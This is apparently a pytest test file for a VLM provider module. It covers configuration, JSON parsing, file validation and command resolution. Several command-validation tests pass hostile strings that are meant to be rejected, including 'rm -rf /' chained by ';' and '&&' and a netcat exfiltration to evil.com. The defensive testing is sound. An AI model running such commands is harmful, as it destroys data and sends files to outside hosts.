"""Tests for navirl.overseer.provider module.

Covers ProviderConfig, JSON extraction/parsing, file path validation,
native command resolution, security checks, and the structured VLM dispatch.
"""

from __future__ import annotations

import json
import os
import tempfile
from pathlib import Path
from unittest import mock

import pytest

from navirl.overseer.provider import (
    MAX_FILE_SIZE,
    MAX_JSON_SIZE,
    ProviderCallError,
    ProviderConfig,
    ProviderUnavailableError,
    _extract_json_text,
    _parse_json_object,
    _resolve_native_command,
    _strict_json_schema_for_codex,
    _validate_file_path,
    run_structured_vlm,
)

# ---------------------------------------------------------------------------
# ProviderConfig
# ---------------------------------------------------------------------------

class TestProviderConfig:
    def test_defaults(self):
        cfg = ProviderConfig()
        assert cfg.provider == "codex"
        assert cfg.model is None
        assert cfg.endpoint is None
        assert cfg.timeout_s == pytest.approx(45.0)
        assert cfg.max_images == 4

    def test_normalized_provider(self):
        assert ProviderConfig(provider="Codex").normalized_provider() == "codex"
        assert ProviderConfig(provider="  Claude  ").normalized_provider() == "claude"
        assert ProviderConfig(provider="OPENAI_COMPATIBLE").normalized_provider() == "openai_compatible"

    def test_normalized_provider_none(self):
        cfg = ProviderConfig(provider=None)
        assert cfg.normalized_provider() == "codex"


# ---------------------------------------------------------------------------
# _validate_file_path
# ---------------------------------------------------------------------------

class TestValidateFilePath:
    def test_valid_file(self, tmp_path):
        f = tmp_path / "test.txt"
        f.write_text("hello")
        result = _validate_file_path(str(f))
        assert result.exists()

    def test_file_not_found(self, tmp_path):
        with pytest.raises(ProviderCallError, match="File not found"):
            _validate_file_path(str(tmp_path / "nonexistent.txt"))

    def test_directory_not_file(self, tmp_path):
        with pytest.raises(ProviderCallError, match="not a regular file"):
            _validate_file_path(str(tmp_path))

    def test_file_too_large(self, tmp_path):
        f = tmp_path / "big.bin"
        f.write_bytes(b"\0")
        real_stat = f.stat()
        fake_stat = os.stat_result((
            real_stat.st_mode, real_stat.st_ino, real_stat.st_dev,
            real_stat.st_nlink, real_stat.st_uid, real_stat.st_gid,
            MAX_FILE_SIZE + 1,  # st_size
            real_stat.st_atime, real_stat.st_mtime, real_stat.st_ctime,
        ))
        with mock.patch("navirl.overseer.provider.Path.stat", return_value=fake_stat), pytest.raises(ProviderCallError, match="too large"):
            _validate_file_path(str(f))


# ---------------------------------------------------------------------------
# _extract_json_text
# ---------------------------------------------------------------------------

class TestExtractJsonText:
    def test_plain_json_object(self):
        raw = '{"key": "value"}'
        assert _extract_json_text(raw) == raw

    def test_json_in_markdown_block(self):
        raw = 'Here is the result:\n```json\n{"key": "value"}\n```\nDone.'
        result = _extract_json_text(raw)
        assert json.loads(result) == {"key": "value"}

    def test_json_embedded_in_prose(self):
        raw = 'The analysis returned {"status": "ok", "count": 3} as expected.'
        result = _extract_json_text(raw)
        assert json.loads(result) == {"status": "ok", "count": 3}

    def test_empty_string_raises(self):
        with pytest.raises(ProviderCallError, match="Empty"):
            _extract_json_text("")

    def test_none_input_raises(self):
        with pytest.raises(ProviderCallError, match="Empty"):
            _extract_json_text(None)

    def test_no_json_raises(self):
        with pytest.raises(ProviderCallError, match="Unable to find JSON"):
            _extract_json_text("No JSON here at all")

    def test_whitespace_only_raises(self):
        with pytest.raises(ProviderCallError, match="Empty"):
            _extract_json_text("   \n\t  ")


# ---------------------------------------------------------------------------
# _parse_json_object
# ---------------------------------------------------------------------------

class TestParseJsonObject:
    def test_valid_json(self):
        result = _parse_json_object('{"a": 1, "b": [2, 3]}')
        assert result == {"a": 1, "b": [2, 3]}

    def test_invalid_json_raises(self):
        # Input with matching braces but invalid JSON content
        with pytest.raises(ProviderCallError, match="Invalid JSON"):
            _parse_json_object('{"key": undefined}')

    def test_oversized_json_raises(self):
        # Create a string that looks like JSON but is over size limit
        big = '{"data": "' + "x" * (MAX_JSON_SIZE + 100) + '"}'
        with pytest.raises(ProviderCallError, match="too large"):
            _parse_json_object(big)


# ---------------------------------------------------------------------------
# _strict_json_schema_for_codex
# ---------------------------------------------------------------------------

class TestStrictJsonSchema:
    def test_adds_additional_properties_false(self):
        schema = {
            "type": "object",
            "properties": {"name": {"type": "string"}},
        }
        strict = _strict_json_schema_for_codex(schema)
        assert strict["additionalProperties"] is False
        assert strict["required"] == ["name"]

    def test_nested_objects(self):
        schema = {
            "type": "object",
            "properties": {
                "inner": {
                    "type": "object",
                    "properties": {"val": {"type": "integer"}},
                },
            },
        }
        strict = _strict_json_schema_for_codex(schema)
        assert strict["additionalProperties"] is False
        inner = strict["properties"]["inner"]
        assert inner["additionalProperties"] is False
        assert inner["required"] == ["val"]

    def test_object_in_array(self):
        schema = {
            "type": "array",
            "items": {
                "type": "object",
                "properties": {"x": {"type": "number"}},
            },
        }
        strict = _strict_json_schema_for_codex(schema)
        items = strict["items"]
        assert items["additionalProperties"] is False

    def test_non_object_passthrough(self):
        schema = {"type": "string"}
        strict = _strict_json_schema_for_codex(schema)
        assert strict == {"type": "string"}

    def test_implicit_object_no_type(self):
        """Object with properties but no explicit 'type' field."""
        schema = {"properties": {"a": {"type": "string"}}}
        strict = _strict_json_schema_for_codex(schema)
        assert strict["additionalProperties"] is False

    def test_list_type_with_object(self):
        """Type is a list containing 'object'."""
        schema = {
            "type": ["object", "null"],
            "properties": {"a": {"type": "string"}},
        }
        strict = _strict_json_schema_for_codex(schema)
        assert strict["additionalProperties"] is False

    def test_non_dict_input(self):
        """Non-dict input returns a minimal object schema."""
        result = _strict_json_schema_for_codex("not a dict")
        assert result["type"] == "object"
        assert result["additionalProperties"] is False


# ---------------------------------------------------------------------------
# _resolve_native_command
# ---------------------------------------------------------------------------

class TestResolveNativeCommand:
    def test_explicit_native_cmd(self):
        cfg = ProviderConfig(native_cmd="/usr/bin/my-tool")
        cmd = _resolve_native_command(cfg)
        assert cmd == "/usr/bin/my-tool"

    def test_codex_env_var(self):
        cfg = ProviderConfig(provider="codex", native_cmd=None)
        with mock.patch.dict(os.environ, {"NAVIRL_CODEX_CMD": "/bin/codex-cli"}):
            cmd = _resolve_native_command(cfg)
            assert cmd == "/bin/codex-cli"

    def test_claude_env_var(self):
        cfg = ProviderConfig(provider="claude", native_cmd=None)
        with mock.patch.dict(os.environ, {"NAVIRL_CLAUDE_CMD": "/bin/claude-cli"}):
            cmd = _resolve_native_command(cfg)
            assert cmd == "/bin/claude-cli"

    def test_generic_env_var(self):
        cfg = ProviderConfig(provider="native", native_cmd=None)
        with mock.patch.dict(os.environ, {"NAVIRL_VLM_NATIVE_CMD": "/bin/vlm"}):
            cmd = _resolve_native_command(cfg)
            assert cmd == "/bin/vlm"

    def test_empty_cmd_returns_empty(self):
        cfg = ProviderConfig(provider="codex", native_cmd=None)
        with mock.patch.dict(os.environ, {"NAVIRL_CODEX_CMD": ""}):
            cmd = _resolve_native_command(cfg)
            assert cmd == ""

    def test_dangerous_semicolon_raises(self):
        cfg = ProviderConfig(native_cmd="echo hello; rm -rf /")
        with pytest.raises(ProviderCallError, match="unsafe"):
            _resolve_native_command(cfg)

    def test_dangerous_pipe_raises(self):
        cfg = ProviderConfig(native_cmd="cat file | nc evil.com 9999")
        with pytest.raises(ProviderCallError, match="unsafe"):
            _resolve_native_command(cfg)

    def test_dangerous_dollar_raises(self):
        cfg = ProviderConfig(native_cmd="echo $HOME")
        with pytest.raises(ProviderCallError, match="unsafe"):
            _resolve_native_command(cfg)

    def test_dangerous_backtick_raises(self):
        cfg = ProviderConfig(native_cmd="echo `whoami`")
        with pytest.raises(ProviderCallError, match="unsafe"):
            _resolve_native_command(cfg)

    def test_dangerous_and_raises(self):
        cfg = ProviderConfig(native_cmd="true && rm -rf /")
        with pytest.raises(ProviderCallError, match="unsafe"):
            _resolve_native_command(cfg)


# ---------------------------------------------------------------------------
# run_structured_vlm — dispatch
# ---------------------------------------------------------------------------

class TestRunStructuredVlm:
    def test_unsupported_provider_raises(self):
        cfg = ProviderConfig(provider="nonexistent_provider")
        with pytest.raises(ProviderUnavailableError, match="Unsupported"):
            run_structured_vlm(
                prompt="test",
                image_paths=[],
                schema={},
                config=cfg,
            )

    def test_native_provider_no_cmd_raises(self):
        cfg = ProviderConfig(provider="codex", native_cmd=None)
        with mock.patch.dict(os.environ, {"NAVIRL_CODEX_CMD": ""}, clear=False), pytest.raises(ProviderUnavailableError, match="No native command"):
            run_structured_vlm(
                prompt="test",
                image_paths=[],
                schema={},
                config=cfg,
            )

    def test_openai_compatible_no_key_raises(self):
        cfg = ProviderConfig(provider="openai_compatible", api_key_env="NONEXISTENT_KEY_12345")
        with mock.patch.dict(os.environ, {}, clear=False):
            # Ensure the key doesn't exist
            os.environ.pop("NONEXISTENT_KEY_12345", None)
            with pytest.raises(ProviderUnavailableError, match="Missing API key"):
                run_structured_vlm(
                    prompt="test",
                    image_paths=[],
                    schema={},
                    config=cfg,
                )

    def test_codex_routes_to_native(self):
        """Codex provider should route to _run_native_json."""
        cfg = ProviderConfig(provider="codex", native_cmd=None)
        with mock.patch.dict(os.environ, {"NAVIRL_CODEX_CMD": ""}, clear=False), pytest.raises(ProviderUnavailableError, match="No native command"):
            run_structured_vlm(
                prompt="test", image_paths=[], schema={}, config=cfg,
            )

    def test_claude_routes_to_native(self):
        """Claude provider should route to _run_native_json."""
        cfg = ProviderConfig(provider="claude", native_cmd=None)
        with mock.patch.dict(os.environ, {"NAVIRL_CLAUDE_CMD": ""}, clear=False), pytest.raises(ProviderUnavailableError, match="No native command"):
            run_structured_vlm(
                prompt="test", image_paths=[], schema={}, config=cfg,
            )

    def test_kimi_routes_to_openai_compatible(self):
        """Kimi provider should route to openai-compatible path."""
        cfg = ProviderConfig(provider="kimi", api_key_env="NONEXISTENT_KEY_12345")
        os.environ.pop("NONEXISTENT_KEY_12345", None)
        with pytest.raises(ProviderUnavailableError, match="Missing API key"):
            run_structured_vlm(
                prompt="test", image_paths=[], schema={}, config=cfg,
            )


# ---------------------------------------------------------------------------
# ProviderCallError and ProviderUnavailableError
# ---------------------------------------------------------------------------

class TestExceptions:
    def test_provider_call_error_is_runtime_error(self):
        assert issubclass(ProviderCallError, RuntimeError)

    def test_provider_unavailable_error_is_runtime_error(self):
        assert issubclass(ProviderUnavailableError, RuntimeError)

    def test_error_message(self):
        err = ProviderCallError("test message")
        assert str(err) == "test message"
